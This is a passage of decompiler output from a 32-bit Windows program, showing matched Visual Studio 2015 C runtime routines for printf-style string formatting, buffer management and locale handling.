  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xfffffb78,param_5);
  pppppppuVar1 = local_464;
  local_478 = (uint)param_1 & 2;
  local_474 = local_464;
  local_470 = param_3;
  local_46c = 0;
  if (((param_1 & 2) != 0) || (local_468 = 0, local_464 == (undefined4 *******)0x0)) {
    local_468 = 1;
  }
  local_464 = &local_474;
  output_processor__(local_460,&local_464,(uint)param_1,param_1._4_4_,param_4,local_484,param_6);
  iVar3 = __crt_stdio_output::
          output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>
          ::process(local_460);
  if (pppppppuVar1 != (undefined4 *******)0x0) {
    if ((param_1 & 1) == 0) {
      if (local_478 == 0) {
        if (param_3 != 0) {
          if (local_46c != param_3) goto LAB_00404690;
LAB_004046dd:
          *(undefined *)((int)pppppppuVar1 + (param_3 - 1)) = 0;
        }
      }
      else if (param_3 != 0) {
        if (-1 < iVar3) {
          if (local_46c == param_3) goto LAB_004046dd;
          goto LAB_00404690;
        }
        *(undefined *)pppppppuVar1 = 0;
      }
    }
    else if (((param_3 != 0) || (iVar3 == 0)) && (local_46c != param_3)) {
LAB_00404690:
      *(undefined *)((int)pppppppuVar1 + local_46c) = 0;
    }
  }
  __crt_stdio_output::formatting_buffer::_formatting_buffer(local_420);
  uVar4 = extraout_DL_00;
  if (local_47c != '\0') {
    *(uint *)(in_stack_fffffb78 + 0x350) = *(uint *)(in_stack_fffffb78 + 0x350) & 0xfffffffd;
  }
LAB_004046b8:
  iVar3 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar4,SUB41(in_stack_fffffb78,0));
  return iVar3;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  int __cdecl common_vsprintf<class __crt_stdio_output::standard_base,wchar_t>(unsigned
// __int64,wchar_t * const,unsigned int,wchar_t const * const,struct __crt_locale_pointers *
// const,char * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
common_vsprintf_class___crt_stdio_output__standard_base_wchar_t_
          (__uint64 param_1,wchar_t *param_2,uint param_3,wchar_t *param_4,
          __crt_locale_pointers *param_5,char *param_6)

{
  undefined4 *******pppppppuVar1;
  int *piVar2;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar4;
  int in_stack_fffffb78;
  undefined local_484 [8];
  char local_47c;
  uint local_478;
  undefined4 *******local_474;
  uint local_470;
  uint local_46c;
  undefined4 local_468;
  undefined4 *******local_464;
  output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
  local_460 [64];
  formatting_buffer local_420 [1048];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  local_464 = (undefined4 *******)param_2;
  if ((param_4 == (wchar_t *)0x0) || ((param_3 != 0 && (param_2 == (wchar_t *)0x0)))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004091be();
    uVar4 = extraout_DL;
    goto LAB_0040483a;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xfffffb78,param_5);
  pppppppuVar1 = local_464;
  local_478 = (uint)param_1 & 2;
  local_474 = local_464;
  local_470 = param_3;
  local_46c = 0;
  if (((param_1 & 2) != 0) || (local_468 = 0, local_464 == (undefined4 *******)0x0)) {
    local_468 = 1;
  }
  local_464 = &local_474;
  output_processor__(local_460,&local_464,(uint)param_1,param_1._4_4_,param_4,local_484,param_6);
  iVar3 = __crt_stdio_output::
          output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_>
          ::process(local_460);
  if (pppppppuVar1 != (undefined4 *******)0x0) {
    if ((param_1 & 1) == 0) {
      if (local_478 == 0) {
        if (param_3 != 0) {
          if (local_46c != param_3) goto LAB_0040480f;
LAB_0040485f:
          *(undefined2 *)((int)pppppppuVar1 + param_3 * 2 + -2) = 0;
        }
      }
      else if (param_3 != 0) {
        if (-1 < iVar3) {
          if (local_46c == param_3) goto LAB_0040485f;
          goto LAB_0040480f;
        }
        *(undefined2 *)pppppppuVar1 = 0;
      }
    }
    else if (((param_3 != 0) || (iVar3 == 0)) && (local_46c != param_3)) {
LAB_0040480f:
      *(undefined2 *)((int)pppppppuVar1 + local_46c * 2) = 0;
    }
  }
  __crt_stdio_output::formatting_buffer::_formatting_buffer(local_420);
  uVar4 = extraout_DL_00;
  if (local_47c != '\0') {
    *(uint *)(in_stack_fffffb78 + 0x350) = *(uint *)(in_stack_fffffb78 + 0x350) & 0xfffffffd;
  }
LAB_0040483a:
  iVar3 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar4,SUB41(in_stack_fffffb78,0));
  return iVar3;
}



// Library Function - Single Match
//  public: unsigned int __thiscall __crt_stdio_output::formatting_buffer::count<char>(void)const 
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

uint __thiscall __crt_stdio_output::formatting_buffer::count_char_(formatting_buffer *this)

{
  if (*(int *)(this + 0x404) == 0) {
    return 0x200;
  }
  return *(uint *)(this + 0x400) >> 1;
}



// Library Function - Single Match
//  public: bool __thiscall
// __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(unsigned int)
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough_char_
          (formatting_buffer *this,uint param_1)

{
  uint uVar1;
  int *piVar2;
  bool bVar3;
  formatting_buffer *local_8;
  
  local_8 = this;
  if (((uint)(0xffffffff / (ulonglong)param_1) & 0xfffffffe) < 2) {
    piVar2 = __errno();
    *piVar2 = 0xc;
    bVar3 = false;
  }
  else {
    uVar1 = param_1 * 2;
    if (((*(int *)(this + 0x404) == 0) && (uVar1 < 0x401)) ||
       (uVar1 < *(uint *)(this + 0x400) || uVar1 == *(uint *)(this + 0x400))) {
      bVar3 = true;
    }
    else {
      local_8 = (formatting_buffer *)__malloc_base(uVar1);
      bVar3 = local_8 != (formatting_buffer *)0x0;
      if (bVar3) {
        __crt_unique_heap_ptr<char,struct___crt_internal_free_policy>::operator_
                  ((__crt_unique_heap_ptr_char_struct___crt_internal_free_policy_ *)(this + 0x404),
                   (__crt_unique_heap_ptr_char_struct___crt_internal_free_policy_ *)&local_8);
        *(uint *)(this + 0x400) = uVar1;
      }
      FID_conflict__free(local_8);
    }
  }
  return bVar3;
}



// Library Function - Single Match
//  bool __cdecl __crt_stdio_output::is_wide_character_specifier<char>(unsigned __int64,char,enum
// __crt_stdio_output::length_modifier)
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

bool __cdecl
__crt_stdio_output::is_wide_character_specifier_char_
          (__uint64 param_1,char param_2,length_modifier param_3)

{
  bool bVar1;
  
  if (param_3 != 2) {
    if ((param_3 == 3) || (param_3 == 0xc)) {
      return true;
    }
    if (param_3 != 0xd) {
      if ((param_2 == 'c') || (param_2 == 's')) {
        bVar1 = true;
      }
      else {
        bVar1 = false;
      }
      return !bVar1;
    }
  }
  return false;
}



// Library Function - Single Match
//  bool __cdecl __crt_stdio_output::is_wide_character_specifier<wchar_t>(unsigned
// __int64,wchar_t,enum __crt_stdio_output::length_modifier)
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

bool __cdecl
__crt_stdio_output::is_wide_character_specifier_wchar_t_
          (__uint64 param_1,wchar_t param_2,length_modifier param_3)

{
  bool bVar1;
  undefined in_stack_0000000d;
  
  if (param_3 == 2) {
    return false;
  }
  if (((param_3 != 3) && (param_3 != 0xc)) && (param_3 != 0xd)) {
    bVar1 = false;
    if ((_param_2 == 99) || (_param_2 == 0x73)) {
      bVar1 = true;
    }
    return ((param_1 & 4) != 0) == bVar1;
  }
  return true;
}



// Library Function - Single Match
//  public: char * __thiscall __crt_stdio_output::formatting_buffer::scratch_data<char>(void)
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

char * __thiscall __crt_stdio_output::formatting_buffer::scratch_data_char_(formatting_buffer *this)

{
  int iVar1;
  uint uVar2;
  formatting_buffer *pfVar3;
  
  iVar1 = *(int *)(this + 0x404);
  uVar2 = count_char_(this);
  if (iVar1 == 0) {
    pfVar3 = this + uVar2;
  }
  else {
    pfVar3 = (formatting_buffer *)(uVar2 + iVar1);
  }
  return (char *)pfVar3;
}



// Library Function - Multiple Matches With Same Base Name
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// int>(unsigned int,unsigned int,bool)
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// int>(unsigned int,unsigned int,bool)
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// int>(unsigned int,unsigned int,bool)
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// int>(unsigned int,unsigned int,bool)
//   12 names - too many to list
// 
// Library: Visual Studio 2015 Release

void __thiscall
type_case_integer_parse_into_buffer__(void *this,uint param_1,uint param_2,char param_3)

{
  uint uVar1;
  char cVar2;
  formatting_buffer *pfVar3;
  
  pfVar3 = *(formatting_buffer **)((int)this + 0x444);
  if (*(formatting_buffer **)((int)this + 0x444) == (formatting_buffer *)0x0) {
    pfVar3 = (formatting_buffer *)((int)this + 0x40);
  }
  uVar1 = __crt_stdio_output::formatting_buffer::count_char_
                    ((formatting_buffer *)((int)this + 0x40));
  *(formatting_buffer **)((int)this + 0x34) = pfVar3 + (uVar1 - 1);
  while ((0 < *(int *)((int)this + 0x28) || (param_1 != 0))) {
    cVar2 = (char)(param_1 % param_2) + '0';
    *(int *)((int)this + 0x28) = *(int *)((int)this + 0x28) + -1;
    if ('9' < cVar2) {
      cVar2 = cVar2 + ((param_3 == '\0') - 1U & 0xe0) + 0x27;
    }
    **(char **)((int)this + 0x34) = cVar2;
    *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + -1;
    param_1 = param_1 / param_2;
  }
  *(int *)((int)this + 0x38) = (int)(pfVar3 + (uVar1 - 1)) - *(int *)((int)this + 0x34);
  *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + 1;
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// __int64>(unsigned __int64,unsigned int,bool)
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// __int64>(unsigned __int64,unsigned int,bool)
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// __int64>(unsigned __int64,unsigned int,bool)
//  private: void __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_integer_parse_into_buffer<unsigned
// __int64>(unsigned __int64,unsigned int,bool)
//   12 names - too many to list
// 
// Library: Visual Studio 2015 Release

void __thiscall
type_case_integer_parse_into_buffer__(void *this,longlong param_1,uint param_2,char param_3)

{
  uint uVar1;
  char extraout_CL;
  char cVar2;
  formatting_buffer *pfVar3;
  
  pfVar3 = *(formatting_buffer **)((int)this + 0x444);
  if (*(formatting_buffer **)((int)this + 0x444) == (formatting_buffer *)0x0) {
    pfVar3 = (formatting_buffer *)((int)this + 0x40);
  }
  uVar1 = __crt_stdio_output::formatting_buffer::count_char_
                    ((formatting_buffer *)((int)this + 0x40));
  *(formatting_buffer **)((int)this + 0x34) = pfVar3 + (uVar1 - 1);
  while( true ) {
    if ((*(int *)((int)this + 0x28) < 1) && (param_1 == 0)) break;
    *(int *)((int)this + 0x28) = *(int *)((int)this + 0x28) + -1;
    param_1 = __aulldvrm((uint)param_1,(uint)((ulonglong)param_1 >> 0x20),param_2,0);
    cVar2 = extraout_CL + '0';
    if ('9' < cVar2) {
      cVar2 = cVar2 + ((param_3 == '\0') - 1U & 0xe0) + 0x27;
    }
    **(char **)((int)this + 0x34) = cVar2;
    *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + -1;
  }
  *(int *)((int)this + 0x38) = (int)(pfVar3 + (uVar1 - 1)) - *(int *)((int)this + 0x34);
  *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + 1;
  return;
}



// Library Function - Single Match
//  void __cdecl __crt_stdio_output::write_multiple_characters<class
// __crt_stdio_output::stream_output_adapter<char>,char>(class
// __crt_stdio_output::stream_output_adapter<char> const &,char,int,int * const)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__crt_stdio_output::
write_multiple_characters_class___crt_stdio_output__stream_output_adapter_char__char_
          (stream_output_adapter_char_ *param_1,char param_2,int param_3,int *param_4)

{
  int iVar1;
  
  iVar1 = 0;
  if (0 < param_3) {
    do {
      stream_output_adapter<char>::write_character(param_1,param_2,param_4);
      if (*param_4 == -1) {
        return;
      }
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_3);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl __crt_stdio_output::write_multiple_characters<class
// __crt_stdio_output::string_output_adapter<char>,char>(class
// __crt_stdio_output::string_output_adapter<char> const &,char,int,int * const)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__crt_stdio_output::
write_multiple_characters_class___crt_stdio_output__string_output_adapter_char__char_
          (string_output_adapter_char_ *param_1,char param_2,int param_3,int *param_4)

{
  int iVar1;
  
  iVar1 = 0;
  if (0 < param_3) {
    do {
      string_output_adapter<char>::write_character(param_1,param_2,param_4);
      if (*param_4 == -1) {
        return;
      }
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_3);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl __crt_stdio_output::write_multiple_characters<class
// __crt_stdio_output::string_output_adapter<wchar_t>,char>(class
// __crt_stdio_output::string_output_adapter<wchar_t> const &,char,int,int * const)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__crt_stdio_output::
write_multiple_characters_class___crt_stdio_output__string_output_adapter_wchar_t__char_
          (string_output_adapter_wchar_t_ *param_1,char param_2,int param_3,int *param_4)

{
  int iVar1;
  
  iVar1 = 0;
  if (0 < param_3) {
    do {
      string_output_adapter<wchar_t>::write_character(param_1,(wchar_t)param_2,param_4);
      if (*param_4 == -1) {
        return;
      }
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_3);
  }
  return;
}



// Library Function - Single Match
//  protected: __thiscall __crt_stdio_output::common_data<char>::common_data<char>(void)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

common_data_char_ * __thiscall
__crt_stdio_output::common_data<char>::common_data_char_(common_data_char_ *this)

{
  *(undefined4 *)this = 0;
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  *(undefined4 *)(this + 0x1c) = 0;
  *(undefined4 *)(this + 0x20) = 0;
  *(undefined4 *)(this + 0x24) = 0;
  *(undefined4 *)(this + 0x28) = 0;
  *(undefined2 *)(this + 0x30) = 0;
  *(undefined4 *)(this + 0x38) = 0;
  this[0x3c] = (common_data_char_)0x0;
  *(undefined4 *)(this + 0x440) = 0;
  *(undefined4 *)(this + 0x444) = 0;
  return this;
}



// Library Function - Single Match
//  protected: __thiscall __crt_stdio_output::common_data<wchar_t>::common_data<wchar_t>(void)
// 
// Library: Visual Studio 2015 Release

common_data_wchar_t_ * __thiscall
__crt_stdio_output::common_data<wchar_t>::common_data_wchar_t_(common_data_wchar_t_ *this)

{
  *(undefined4 *)this = 0;
  *(undefined2 *)(this + 0x32) = 0;
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  *(undefined4 *)(this + 0x1c) = 0;
  *(undefined4 *)(this + 0x20) = 0;
  *(undefined4 *)(this + 0x24) = 0;
  *(undefined4 *)(this + 0x28) = 0;
  this[0x30] = (common_data_wchar_t_)0x0;
  *(undefined4 *)(this + 0x38) = 0;
  this[0x3c] = (common_data_wchar_t_)0x0;
  *(undefined4 *)(this + 0x440) = 0;
  *(undefined4 *)(this + 0x444) = 0;
  return this;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: __thiscall __crt_stdio_output::output_adapter_data<char,class
// __crt_stdio_output::stream_output_adapter<char>>::output_adapter_data<char,class
// __crt_stdio_output::stream_output_adapter<char>>(class
// __crt_stdio_output::stream_output_adapter<char> const &,unsigned __int64,char const *
// const,struct __crt_locale_pointers * const,char * const)
//  protected: __thiscall __crt_stdio_output::output_adapter_data<char,class
// __crt_stdio_output::string_output_adapter<char>>::output_adapter_data<char,class
// __crt_stdio_output::string_output_adapter<char>>(class
// __crt_stdio_output::string_output_adapter<char> const &,unsigned __int64,char const *
// const,struct __crt_locale_pointers * const,char * const)
// 
// Library: Visual Studio 2015 Release

undefined4 * __thiscall
output_adapter_data__
          (void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5,undefined4 param_6)

{
  __crt_stdio_output::common_data<char>::common_data_char_((common_data_char_ *)this);
  *(undefined4 *)((int)this + 0x448) = *param_1;
  *(undefined4 *)this = param_2;
  *(undefined4 *)((int)this + 4) = param_3;
  *(undefined4 *)((int)this + 8) = param_5;
  *(undefined4 *)((int)this + 0x10) = param_4;
  *(undefined4 *)((int)this + 0x14) = param_6;
  return (undefined4 *)this;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: __thiscall __crt_stdio_output::output_adapter_data<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>::output_adapter_data<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>(class
// __crt_stdio_output::stream_output_adapter<wchar_t> const &,unsigned __int64,wchar_t const *
// const,struct __crt_locale_pointers * const,char * const)
//  protected: __thiscall __crt_stdio_output::output_adapter_data<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>::output_adapter_data<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>(class
// __crt_stdio_output::string_output_adapter<wchar_t> const &,unsigned __int64,wchar_t const *
// const,struct __crt_locale_pointers * const,char * const)
// 
// Library: Visual Studio 2015 Release

undefined4 * __thiscall
output_adapter_data__
          (void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5,undefined4 param_6)

{
  __crt_stdio_output::common_data<wchar_t>::common_data_wchar_t_((common_data_wchar_t_ *)this);
  *(undefined4 *)((int)this + 0x448) = *param_1;
  *(undefined4 *)this = param_2;
  *(undefined4 *)((int)this + 4) = param_3;
  *(undefined4 *)((int)this + 8) = param_5;
  *(undefined4 *)((int)this + 0x10) = param_4;
  *(undefined4 *)((int)this + 0x14) = param_6;
  return (undefined4 *)this;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>(class
// __crt_stdio_output::string_output_adapter<char> const &,unsigned __int64,char const *
// const,struct __crt_locale_pointers * const,char * const)
//  public: __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>(class
// __crt_stdio_output::string_output_adapter<char> const &,unsigned __int64,char const *
// const,struct __crt_locale_pointers * const,char * const)
// 
// Library: Visual Studio 2015 Release

void * __thiscall
output_processor__(void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3,
                  undefined4 param_4,undefined4 param_5,undefined4 param_6)

{
  int *piVar1;
  
  output_adapter_data__(this,param_1,param_2,param_3,param_4,param_5,param_6);
  *(undefined4 *)((int)this + 0x450) = 0;
  piVar1 = __errno();
  *(int **)((int)this + 0xc) = piVar1;
  return this;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>(class
// __crt_stdio_output::string_output_adapter<wchar_t> const &,unsigned __int64,wchar_t const *
// const,struct __crt_locale_pointers * const,char * const)
//  public: __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>(class
// __crt_stdio_output::string_output_adapter<wchar_t> const &,unsigned __int64,wchar_t const *
// const,struct __crt_locale_pointers * const,char * const)
// 
// Library: Visual Studio 2015 Release

void * __thiscall
output_processor__(void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3,
                  undefined4 param_4,undefined4 param_5,undefined4 param_6)

{
  int *piVar1;
  
  output_adapter_data__(this,param_1,param_2,param_3,param_4,param_5,param_6);
  *(undefined4 *)((int)this + 0x450) = 0;
  piVar1 = __errno();
  *(int **)((int)this + 0xc) = piVar1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,__crt_locale_pointers *param_1)

{
  uint uVar1;
  undefined *puVar2;
  __acrt_ptd *p_Var3;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (__crt_locale_pointers *)0x0) {
    if (DAT_0041bd84 != 0) {
      p_Var3 = ___acrt_getptd();
      *(__acrt_ptd **)this = p_Var3;
      *(int *)(this + 4) = *(int *)(p_Var3 + 0x4c);
      *(int **)(this + 8) = *(int **)(p_Var3 + 0x48);
      ___acrt_update_locale_info((int)p_Var3,(int *)(this + 4));
      ___acrt_update_multibyte_info(*(int *)this,(int **)(this + 8));
      uVar1 = *(uint *)(*(int *)this + 0x350);
      if ((uVar1 & 2) != 0) {
        return this;
      }
      *(uint *)(*(int *)this + 0x350) = uVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
      return this;
    }
    *(undefined **)(this + 4) = PTR_PTR_DAT_0041b1e8;
    puVar2 = PTR_DAT_0041b1ec;
  }
  else {
    *(undefined4 *)(this + 4) = *(undefined4 *)param_1;
    puVar2 = *(undefined **)(param_1 + 4);
  }
  *(undefined **)(this + 8) = puVar2;
  return this;
}



// Library Function - Single Match
//  public: __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(void)
// 
// Library: Visual Studio 2015 Release

void __thiscall __crt_stdio_output::formatting_buffer::_formatting_buffer(formatting_buffer *this)

{
  FID_conflict__free(*(void **)(this + 0x404));
  *(undefined4 *)(this + 0x404) = 0;
  return;
}



// Library Function - Single Match
//  public: class __crt_unique_heap_ptr<char,struct __crt_internal_free_policy>& __thiscall
// __crt_unique_heap_ptr<char,struct __crt_internal_free_policy>::operator=(class
// __crt_unique_heap_ptr<char,struct __crt_internal_free_policy>&&)
// 
// Library: Visual Studio 2015 Release

__crt_unique_heap_ptr_char_struct___crt_internal_free_policy_ * __thiscall
__crt_unique_heap_ptr<char,struct___crt_internal_free_policy>::operator_
          (__crt_unique_heap_ptr_char_struct___crt_internal_free_policy_ *this,
          __crt_unique_heap_ptr_char_struct___crt_internal_free_policy_ *param_1)

{
  FID_conflict__free(*(void **)this);
  *(undefined4 *)this = 0;
  *(undefined4 *)this = *(undefined4 *)param_1;
  *(undefined4 *)param_1 = 0;
  return this;
}



// Library Function - Single Match
//  public: int __thiscall <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>::operator()(void)const 
// 
// Library: Visual Studio 2015 Release

int __thiscall
<lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>::operator__
          (_lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b_ *this)

{
  FILE *pFVar1;
  uint uVar2;
  int iVar3;
  undefined extraout_DL;
  int in_stack_fffffb84;
  undefined local_478 [8];
  char local_470;
  uint local_468;
  undefined4 local_464;
  output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
  local_460 [64];
  formatting_buffer local_420 [1048];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pFVar1 = **(FILE ***)this;
  uVar2 = ___acrt_stdio_begin_temporary_buffering_nolock(pFVar1);
  local_468 = local_468 & 0xffffff00 | uVar2 & 0xff;
  _LocaleUpdate::_LocaleUpdate
            ((_LocaleUpdate *)&stack0xfffffb84,**(__crt_locale_pointers ***)(this + 4));
  local_464 = **(undefined4 **)this;
  output_processor__(local_460,&local_464,**(undefined4 **)(this + 8),
                     (*(undefined4 **)(this + 8))[1],**(undefined4 **)(this + 0xc),local_478,
                     **(undefined4 **)(this + 0x10));
  __crt_stdio_output::
  output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_>
  ::process(local_460);
  __crt_stdio_output::formatting_buffer::_formatting_buffer(local_420);
  if (local_470 != '\0') {
    *(uint *)(in_stack_fffffb84 + 0x350) = *(uint *)(in_stack_fffffb84 + 0x350) & 0xfffffffd;
  }
  ___acrt_stdio_end_temporary_buffering_nolock((char)local_468,pFVar1);
  iVar3 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,extraout_DL,SUB41(in_stack_fffffb84,0));
  return iVar3;
}



// Library Function - Single Match
//  void __cdecl __crt_stdio_output::crop_zeroes(char *,struct __crt_locale_pointers * const)
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

void __cdecl __crt_stdio_output::crop_zeroes(char *param_1,__crt_locale_pointers *param_2)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  
  for (; (*param_1 != '\0' && (*param_1 != ***(char ***)(*(int *)param_2 + 0x88)));
      param_1 = param_1 + 1) {
  }
  if (*param_1 != '\0') {
    do {
      param_1 = param_1 + 1;
      cVar1 = *param_1;
      pcVar2 = param_1;
      if ((cVar1 == '\0') || (cVar1 == 'e')) break;
    } while (cVar1 != 'E');
    do {
      pcVar3 = pcVar2;
      pcVar2 = pcVar3 + -1;
    } while (*pcVar2 == '0');
    if (*pcVar2 == ***(char ***)(*(int *)param_2 + 0x88)) {
      pcVar2 = pcVar3 + -2;
    }
    do {
      cVar1 = *param_1;
      pcVar2 = pcVar2 + 1;
      param_1 = param_1 + 1;
      *pcVar2 = cVar1;
    } while (cVar1 != '\0');
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: enum __crt_stdio_output::state __thiscall
// __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::find_next_state(char,enum
// __crt_stdio_output::state)const 
//  private: enum __crt_stdio_output::state __thiscall
// __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::find_next_state(char,enum
// __crt_stdio_output::state)const 
// 
// Library: Visual Studio 2015 Release

byte find_next_state(char param_1,int param_2)

{
  uint uVar1;
  
  if ((byte)(param_1 - 0x20U) < 0x5b) {
    uVar1 = *(byte *)((int)L"mscoree.dll" + param_1 + 8) & 0xf;
  }
  else {
    uVar1 = 0;
  }
  return (byte)(&DAT_00414ad0)[uVar1 * 8 + param_2] >> 4;
}



// Library Function - Multiple Matches With Same Base Name
